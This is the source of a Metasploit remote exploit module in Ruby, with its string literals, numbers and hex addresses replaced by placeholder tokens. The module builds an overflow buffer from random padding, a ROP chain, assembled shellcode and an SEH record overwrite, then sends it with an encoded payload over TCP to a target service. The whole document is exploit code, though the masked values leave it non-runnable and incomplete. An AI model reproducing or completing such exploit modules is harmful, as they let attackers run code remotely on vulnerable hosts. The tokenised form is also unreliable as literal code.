require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: Tcp include Msf :: Exploit :: Seh def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , } , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > <int> , <str> = > true } , <str> = > [ [ <str> , { <str> = > <hex> , <str> = > <int> , <str> = > <int> , <str> = > <int> } ] , [ <str> , { <str> = > <hex> , <str> = > <int> } ] , ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self . class ) end def junk ( n = <int> ) return [ rand_text_alpha ( <int> ) . unpack ( <str> ) [ <int> ] ] * n end def nops ( rop = false , n = <int> ) return rop ? [ <hex> ] * n : [ <hex> ] * n end def asm ( code ) Metasm :: Shellcode . assemble ( Metasm :: Ia32 . new , code ) . encode_string end def exploit rop = [ nops ( true , <int> ) , <hex> , <hex> , <hex> , <hex> , junk , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , nops ( true ) , <hex> , nops , <hex> ] . flatten . pack ( <str> ) connect if target . name =~ <str> buffer = rand_text ( target [ <str> ] ) buffer << generate_seh_record ( target . ret ) buffer << payload . encoded else buffer = rand_text ( target [ <str> ] ) buffer << rop buffer << asm ( <str> target [ <str> ] . to_s ( <int> ) <str> ) buffer << rand_text ( target [ <str> ] - buffer . length ) buffer << generate_seh_record ( target . ret ) buffer << payload . encoded end print_status ( <str> target . name <str> ) sock . put ( buffer ) disconnect end end 
